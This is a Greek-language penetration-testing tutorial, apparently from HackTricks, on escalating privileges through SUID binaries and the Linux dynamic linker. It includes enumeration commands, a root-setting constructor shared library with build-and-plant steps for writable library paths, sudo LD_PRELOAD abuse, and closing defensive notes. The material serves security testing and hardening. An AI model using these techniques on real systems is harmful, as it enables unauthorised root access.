# SUID Shared Library και Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

Τα SUID binaries συνήθως ελέγχονται για άμεση εκτέλεση εντολών, όμως τα custom SUID προγράμματα μπορεί επίσης να είναι ευάλωτα μέσω του dynamic linker. Το κοινό μοτίβο είναι απλό: ένα privileged executable φορτώνει code από ένα path ή configuration που μπορεί να επηρεάσει ένας χρήστης με χαμηλότερα privileges.

Αυτή η σελίδα επικεντρώνεται σε generic technique patterns: missing libraries, writable library directories, `RPATH`/`RUNPATH`, `LD_PRELOAD` μέσω sudo, linker configuration και SUID hardlink confusion.

## Γρήγορο Enumeration

Ξεκινήστε εντοπίζοντας ασυνήθιστα SUID files και ελέγχοντας αν είναι dynamically linked:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Εστιάστε σε μη τυπικές τοποθεσίες, προσαρμοσμένες διαδρομές εφαρμογών, binaries που ανήκουν στον root αλλά βρίσκονται εκτός καταλόγων που διαχειρίζονται πακέτα και dependencies που φορτώνονται από εγγράψιμους καταλόγους.

Χρήσιμοι έλεγχοι δυνατότητας εγγραφής:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Ορισμένα custom SUID binaries προσπαθούν να φορτώσουν ένα shared object που δεν υπάρχει. Αν το missing path βρίσκεται κάτω από έναν κατάλογο που ελέγχεται από τον attacker, το binary μπορεί να φορτώσει κώδικα που παρέχεται από τον attacker ως ο effective user.

Εντοπίστε αποτυχημένες αναζητήσεις βιβλιοθηκών:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Εάν το binary αναζητά το `libexample.so` σε ένα writable path, μια minimal βιβλιοθήκη proof μπορεί να χρησιμοποιήσει έναν constructor. Διατηρήστε το proof-of-impact harmless κατά την επικύρωση:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Κατασκευάστε το με το ακριβές όνομα αρχείου που προσπαθεί να φορτώσει το binary:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Η εκμεταλλεύσιμη συνθήκη δεν είναι μόνο η απουσία της library. Ο attacker πρέπει να μπορεί να τοποθετήσει ένα συμβατό shared object σε μια διαδρομή που ο privileged loader θα αποδεχτεί.

## Writable Library Directory

Μερικές φορές όλες οι dependencies υπάρχουν, αλλά ένας από τους directories που χρησιμοποιούνται για την επίλυσή τους είναι writable. Αυτό μπορεί να επιτρέψει την αντικατάσταση μιας loaded library ή την τοποθέτηση μιας library υψηλότερης προτεραιότητας με το ίδιο όνομα.

Ελέγξτε τα dependency paths:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Αν ο κατάλογος είναι εγγράψιμος, επικυρώστε το με μια προσέγγιση ασφαλή για αντιγραφή σε lab. Η αντικατάσταση system libraries σε live host μπορεί να διακόψει το authentication, το package management ή services κρίσιμα για το boot.

## RPATH και RUNPATH

Τα `RPATH` και `RUNPATH` είναι entries του dynamic section που ενημερώνουν τον loader πού να αναζητήσει libraries. Είναι επικίνδυνα σε SUID programs όταν δείχνουν σε directories εγγράψιμους από attacker.

Εντοπίστε τα:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Παράδειγμα επικίνδυνου output:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Εάν το `/opt/app/lib` είναι εγγράψιμο και το binary χρειάζεται το `libcustom.so`, ο επιτιθέμενος μπορεί να είναι σε θέση να τοποθετήσει εκεί ένα κακόβουλο `libcustom.so`:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
Τα `RPATH` και `RUNPATH` δεν είναι πανομοιότυπα σε όλες τις λεπτομέρειες επίλυσης, αλλά για τον έλεγχο privilege escalation το πρακτικό ερώτημα είναι το ίδιο: αναζητά το SUID binary ένα όνομα library σε directory που μπορεί να εγγράψει ο attacker;

## LD_PRELOAD, LD_LIBRARY_PATH και SUID

Για τα κανονικά προγράμματα, τα `LD_PRELOAD` και `LD_LIBRARY_PATH` μπορούν να επιβάλουν ή να επηρεάσουν τη φόρτωση shared object. Για τα SUID προγράμματα, ο dynamic loader συνήθως ενεργοποιεί τη secure-execution mode και αγνοεί τις επικίνδυνες environment variables.

Αυτό σημαίνει ότι ένα απλό SUID binary συνήθως δεν είναι ευάλωτο μόνο και μόνο επειδή ο χρήστης μπορεί να ορίσει το `LD_PRELOAD`:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Η συνηθισμένη εξαίρεση είναι η misconfiguration του sudo. Αν το `sudo -l` εμφανίζει ότι διατηρείται μια μεταβλητή όπως η `LD_PRELOAD` ή η `LD_LIBRARY_PATH`, μια εντολή που επιτρέπεται από το sudo μπορεί να φορτώσει code που ελέγχεται από attacker:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Μην συγχέετε αυτές τις περιπτώσεις:

- `LD_PRELOAD` σε ένα κανονικό SUID binary: συνήθως αποκλείεται από το secure execution.
- `LD_PRELOAD` που διατηρείται από το sudo: potentially exploitable.
- Απουσία `.so` σε writable path: exploitable όταν το SUID binary φορτώνει φυσιολογικά αυτό το path.
- `RPATH`/`RUNPATH` προς έναν writable directory: exploitable όταν είναι δυνατός ο έλεγχος μιας απαιτούμενης library.
- Δικαιώματα write στο `/etc/ld.so.preload` ή σε linker config: επηρεάζουν όλο το system και έχουν υψηλό impact.

## Ρύθμιση του Linker

Ο dynamic linker διαβάζει επίσης system configuration, όπως τα `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, το linker cache και, σε ορισμένες περιπτώσεις, το `/etc/ld.so.preload`.

Έλεγχοι υψηλής αξίας:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Η εγγράψιμη διαμόρφωση του linker είναι συνήθως πιο σοβαρή από ένα μεμονωμένο ευάλωτο SUID binary, επειδή μπορεί να επηρεάσει πολλές δυναμικά συνδεδεμένες διεργασίες. Το `/etc/ld.so.preload` είναι ιδιαίτερα επικίνδυνο, επειδή μπορεί να επιβάλει τη φόρτωση ενός shared object σε διεργασίες με αυξημένα δικαιώματα.

## SUID Hardlink Confusion

Τα hardlinks μπορούν να κάνουν το ίδιο SUID inode να εμφανίζεται με πολλά ονόματα. Αυτό είναι χρήσιμο για την απόκρυψη ενός privileged helper, την παραπλάνηση κατά τον καθαρισμό ή την παράκαμψη ενός απλοϊκού ελέγχου βάσει διαδρομής.

Βρείτε αρχεία SUID με περισσότερους από έναν συνδέσμους:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Ελέγξτε όλες τις διαδρομές προς το ίδιο inode:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Η κατάχρηση δεν έγκειται στο ότι ένα hardlink αλλάζει δικαιώματα. Η κατάχρηση είναι η σύγχυση διαδρομής: ένα privileged inode μπορεί να είναι προσβάσιμο μέσω ενός ονόματος που οι defenders ή τα scripts δεν αναμένουν. Για πιο αναλυτικές πληροφορίες σχετικά με τα inode και τη ροή εργασίας των hardlink, δείτε [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Αμυντικές σημειώσεις

- Διατηρείτε τα SUID binaries ελάχιστα, ελεγμένα και υπό διαχείριση πακέτων όπου είναι δυνατό.
- Αποφεύγετε καταχωρίσεις `RPATH`/`RUNPATH` που δείχνουν σε καταλόγους στους οποίους υπάρχει δυνατότητα εγγραφής ή τους οποίους διαχειρίζεται κάποια εφαρμογή.
- Διατηρείτε τους καταλόγους βιβλιοθηκών υπό την ιδιοκτησία του root και χωρίς δυνατότητα εγγραφής από κανονικούς χρήστες.
- Μην διατηρείτε τις μεταβλητές loader `LD_PRELOAD`, `LD_LIBRARY_PATH` ή παρόμοιες μέσω του sudo.
- Παρακολουθείτε τα `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` και μη αναμενόμενα SUID αρχεία.
- Ελέγχετε αρχεία SUID με hardlink και διερευνάτε custom SUID wrappers εκτός των τυπικών διαδρομών του συστήματος.
